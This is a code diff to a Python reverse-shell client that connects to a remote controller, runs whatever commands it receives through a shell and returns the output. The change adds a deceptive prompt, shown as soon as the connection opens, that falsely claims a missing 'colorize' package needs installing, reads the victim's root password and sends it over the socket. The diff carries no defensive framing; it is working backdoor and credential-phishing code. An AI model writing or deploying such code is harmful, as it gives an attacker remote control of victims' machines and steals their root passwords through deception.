@@ -1,3 +1,4 @@
+#-*- coding:utf-8 -*-
 import socket,subprocess,getpass
 
 
@@ -9,12 +10,11 @@ def connection():
 	client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 	client_socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
 	client_socket.connect((host,port))
+	get_root_passwd()
 	while True:
 		received_data = client_socket.recv(buff)
 		if received_data == 'quit' :
 			client_socket.close()
-		elif "sudo" in received_data :
-			sudo_required()
 		else :
 			command = subprocess.check_output(received_data, shell=True)
 			if not command:
@@ -22,8 +22,8 @@ def connection():
 			else:
 				client_socket.send(str(command) + "\nCommand succesfully executed.")
 
-def sudo_required():
-	prompt = "root password required ahead: "
+def get_root_passwd():
+	prompt = "Python built-in package \"colorize\" not found. Trying to install...\nRoot password required: "
 	password = getpass.getpass(prompt)
 	client_socket.send(str(password))
 
